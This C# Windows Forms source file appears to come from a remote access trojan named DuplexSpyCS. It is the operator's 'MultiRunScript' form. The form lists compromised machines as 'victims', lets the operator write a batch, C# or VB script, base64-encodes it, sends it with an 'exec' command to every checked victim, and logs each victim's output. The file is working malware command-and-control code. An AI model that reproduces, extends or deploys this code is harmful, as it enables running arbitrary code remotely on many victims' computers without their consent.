using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace DuplexSpyCS
{
    public partial class frmMultiRunScript : Form
    {
        private TextEditorControl editor = new TextEditorControl();

        private List<clsVictim> m_lsVictim { get; init; }
        private List<string> m_lsScript = new List<string>
        {
            "bat", "cs", "vb",
        };

        private Dictionary<string, string> m_dicDefaultCode = new Dictionary<string, string>()
        {
            {
                "bat",
        @"@echo off
echo Hello, World!"
            },
            {
                "cs",
        @"using System;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine(""Hello, World!"");
    }
}"
            },
            {
                "vb",
                @"Imports System

Module Program
    Sub Main(args As String())
        Console.WriteLine(""Hello World!"")
    End Sub
End Module"
            }
        };

        public frmMultiRunScript(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            Text = $"MultiRunScript[{lsVictim.Count}]";
            StartPosition = FormStartPosition.CenterScreen;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (lsMsg[0] == "exec")
            {
                if (m_lsScript.Contains(lsMsg[1]))
                {
                    int code = int.Parse(lsMsg[2]);
                    string output = clsCrypto.b64D2Str(lsMsg[3]);

                    Invoke(new Action(() =>
                    {
                        try
                        {
                            ListViewItem item = listView1.FindItemWithText(victim.ID);
                            if (item != null)
                                item.SubItems[1].Text = code == 0 ? "Failed" : "Executed";

                            fnLogs(victim, output);
                        }
                        catch (InvalidOperationException)
                        {

                        }
                    }));
                }
            }
        }

        void fnLogs(clsVictim victim, string szMsg)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText($"[{victim.ID}]: {szMsg}");
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void ReqExecuteScript()
        {
            tabControl1.SelectedIndex = 0;

            string script = editor.Text;
            int nIdx = toolStripComboBox1.SelectedIndex;
            string b64Script = clsCrypto.b64E2Str(script);

            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
            if (lsVictim.Count == 0)
            {
                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var v in lsVictim)
            {
                try
                {
                    v.fnSendCommand(new string[]
                    {
                        "exec",
                        m_lsScript[nIdx],
                        b64Script,
                        string.Empty,
                    });
                }
                catch (Exception ex)
                {
                    fnLogs(v, ex.Message);
                    clsStore.sql_conn.WriteErrorLogs(v, ex.Message);
                }
            }
        }

        void setup()
        {
            //Add text editor control
            if (editor == null)
                editor = new TextEditorControl();

            tabPage2.Controls.Add(editor);
            editor.Dock = DockStyle.Fill;

            foreach (clsVictim victim in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(victim.ID);
                item.SubItems.Add("?");
                item.Tag = victim;
                listView1.Items.Add(item);

                victim.m_listener.ReceivedDecoded += fnRecv;
            }

            listView1.Refresh();

            //TextEditor
            if (editor == null)
                editor = new TextEditorControl();

            tabControl1.TabPages[1].Controls.Add(editor);
            editor.Dock = DockStyle.Fill;
            editor.BringToFront();

            //Status label
            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";

            toolStripComboBox1.SelectedIndex = 1;
            toolStripComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
        }

        private void frmMultiRunScript_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Execute
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            ReqExecuteScript();
        }

        //Check all
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }

        private void frmMultiRunScript_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void toolStripComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            editor.Text = string.IsNullOrEmpty(editor.Text) ? m_dicDefaultCode[m_lsScript[toolStripComboBox1.SelectedIndex]] : editor.Text;
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\RunScript").Show();
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (tabControl1.SelectedIndex == 1)
            {
                if (e.KeyCode == Keys.F5)
                {
                    editor.Text = m_dicDefaultCode[m_lsScript[toolStripComboBox1.SelectedIndex]];
                    editor.Refresh();
                }
            }
        }
    }
}
